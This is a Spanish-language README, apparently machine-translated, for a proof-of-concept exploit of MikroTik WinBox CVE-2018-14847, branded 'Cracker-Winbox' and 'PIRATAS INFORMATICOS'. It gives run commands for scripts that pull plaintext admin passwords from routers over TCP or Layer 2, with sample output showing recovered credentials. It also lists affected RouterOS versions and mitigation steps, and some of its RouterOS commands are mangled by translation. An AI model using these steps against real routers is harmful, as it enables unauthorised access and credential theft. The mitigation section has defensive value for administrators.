# Cracker-Winbox

#PIRATAS INFORMATICOS

WinboxExploit
Esta es una prueba de concepto de la vulnerabilidad crítica de WinBox (CVE-2018-14847) que permite la lectura de archivos arbitrarios de contraseñas de texto sin formato.


## Requisitos
- Python 3+

Este script NO se ejecutará con Python 2.xo inferior.

## Cómo utilizar
El script se usa de manera simple con argumentos simples en la línea de comandos.

#### WinBox (TCP / IP)
Explote la vulnerabilidad y lea la contraseña.
`` `
python3 WinboxExploit.py <DIRECCIÓNIP> [PUERTO]
`` `
Ejemplo:
`` `
$ python3 WinboxExploit.py 172.17.17.17
Conectado a 172.17.17.17:8291
Explotar exitosamente
Usuario: admin
Pase: Th3P4ssWord
`` `

#### Servidor MAC WinBox (Capa 2)
Puede extraer archivos incluso si el dispositivo no tiene una dirección IP.

Comprobación de descubrimiento simple para dispositivos Mikrotik conectados localmente.
`` `
python3 MACServerDiscover.py
`` `
Ejemplo:
`` `
$ python3 MACServerDiscover.py
Buscando dispositivos Mikrotik (servidores MAC)

    aa: bb: cc: dd: ee: ff

    aa: bb: cc: dd: ee: aa
`` `

Explote la vulnerabilidad y lea la contraseña.
`` `
python3 MACServerExploit.py <DIRECCIÓN MAC>
`` `
Ejemplo:
`` `
$ python3 MACServerExploit.py aa: bb: cc: dd: ee: ff

Usuario: admin
Pase: Th3P4ssWord
`` `

## Versiones Vulnerables
Todas las versiones de RouterOS del 28/05/2015 al 20/04/2018 son vulnerables a esta vulnerabilidad.

Dispositivos Mikrotik con versiones de RouterOS:

- Largo plazo: 6.30.1 - 6.40.7
- Estable: 6.29 - 6.42
- Beta: 6.29rc1 - 6.43rc3

Para obtener más información, consulte: https://blog.mikrotik.com/security/winbox-vulnerability.html

## Técnicas de mitigación
- Actualice el enrutador a una versión de RouterOS que incluya la solución.
- Deshabilite el servicio WinBox en el enrutador.
- Puede restringir el acceso al servicio WinBox a direcciones IP específicas con lo siguiente:
`` `
/ ip service set winbox address = 10.0.0.0 / 8,172.16.0.0 / 12,192.168.0.0 / 16
`` `
- Puede usar algunas Reglas de filtro (ACL) para denegar el acceso externo al servicio WinBox:
`` `
/ ip firewall filter add chain = input in-interface = wan protocol = tcp dst-port = 8291 action = drop
`` `
- Se puede limitar el acceso al servicio mac-winbox especificando las interfaces permitidas:
`` `
/ herramienta mac-server mac-winbox
`` `

## Copyright
 - Patrocinado por el CERTCC de Irán (https://certcc.ir). Todos los derechos reservados.
